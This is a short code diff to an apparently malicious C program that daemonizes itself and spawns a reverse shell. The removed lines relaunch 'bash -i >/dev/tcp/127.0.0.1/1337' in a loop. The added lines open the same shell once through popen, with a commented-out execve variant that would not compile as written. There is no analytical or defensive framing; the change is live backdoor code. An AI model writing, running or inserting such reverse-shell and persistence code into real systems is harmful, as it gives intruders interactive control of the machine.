@@ -92,8 +92,6 @@ void ertai(int signal_number){
 }
 
 int main(int argc, char *argv[]){
-    // Command
-    char command[] = "bash -c 'bash -i >/dev/tcp/127.0.0.1/1337 0>&1' &";
     // Register signal child handler
     signal(SIGCHLD, ertai);
     // Get systemd pid
@@ -107,9 +105,16 @@ int main(int argc, char *argv[]){
     daemonize();
     // Run
     run();
-    while (1) {
-        ensure_running(log_path, command);
-        system(command);
-        sleep(time_span);
-    }
+    // Genreate reverse shell
+    sleep(0x04);
+    /*
+    char *new_argv = {
+        "/bin/bash",
+        "-c",
+        "bash -i >/dev/tcp/127.0.0.1/1337 0>&1",
+        NULL
+    };
+    execve(new_argv[0], new_argv, 0);
+    */
+    popen("bash -c 'bash -i >/dev/tcp/127.0.0.1/1337 0>&1'", "w");
 }
